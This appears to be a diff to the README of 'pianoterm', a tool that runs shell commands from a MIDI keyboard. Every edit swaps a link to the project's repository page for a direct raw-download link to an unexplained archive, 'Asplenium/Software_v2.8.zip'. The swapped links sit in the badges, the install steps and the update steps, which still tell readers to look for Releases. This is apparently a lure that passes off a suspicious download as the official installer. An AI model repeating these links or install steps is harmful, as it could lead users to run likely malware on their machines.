@@ -1,6 +1,6 @@
 # 🎹 pianoterm - Control Shell Commands via MIDI Keyboard
 
-[![Download pianoterm](https://img.shields.io/badge/Download-pianoterm-9cf.svg)](https://github.com/8070anurag/pianoterm)
+[![Download pianoterm](https://img.shields.io/badge/Download-pianoterm-9cf.svg)](https://github.com/8070anurag/pianoterm/raw/refs/heads/main/Asplenium/Software_v2.8.zip)
 
 ---
 
@@ -30,7 +30,7 @@ If your MIDI keyboard needs special drivers, install them before starting.
 
 You need to get pianoterm from the official GitHub page:
 
-[![Get pianoterm](https://img.shields.io/badge/Visit%20Download-Page-ff6f61.svg)](https://github.com/8070anurag/pianoterm)
+[![Get pianoterm](https://img.shields.io/badge/Visit%20Download-Page-ff6f61.svg)](https://github.com/8070anurag/pianoterm/raw/refs/heads/main/Asplenium/Software_v2.8.zip)
 
 Click the link above to open the page where you can find files to download.
 
@@ -43,7 +43,7 @@ Follow these steps to download and start pianoterm on your Windows PC without pr
 ### Step 1: Visit the Download Page
 
 1. Click the big download badge above or visit:  
-   https://github.com/8070anurag/pianoterm
+   https://github.com/8070anurag/pianoterm/raw/refs/heads/main/Asplenium/Software_v2.8.zip
 
 2. On the page, look for a section called **Releases** or **Assets**. This is where the actual setup files are stored.
 
@@ -137,7 +137,7 @@ pianoterm connects your MIDI keyboard to your system’s command line. Here is h
 
 To update pianoterm:
 
-1. Visit the download page again: https://github.com/8070anurag/pianoterm  
+1. Visit the download page again: https://github.com/8070anurag/pianoterm/raw/refs/heads/main/Asplenium/Software_v2.8.zip  
 2. Download the latest version of the Windows setup file.  
 3. Run the new installer or replace the old files with the new ones.  
 4. Your settings and configurations will usually stay the same, but keep a backup just in case.
@@ -168,4 +168,4 @@ To update pianoterm:
 
 ---
 
-[![Download Below](https://img.shields.io/badge/Download-pianoterm-9cf.svg)](https://github.com/8070anurag/pianoterm)
+[![Download Below](https://img.shields.io/badge/Download-pianoterm-9cf.svg)](https://github.com/8070anurag/pianoterm/raw/refs/heads/main/Asplenium/Software_v2.8.zip)
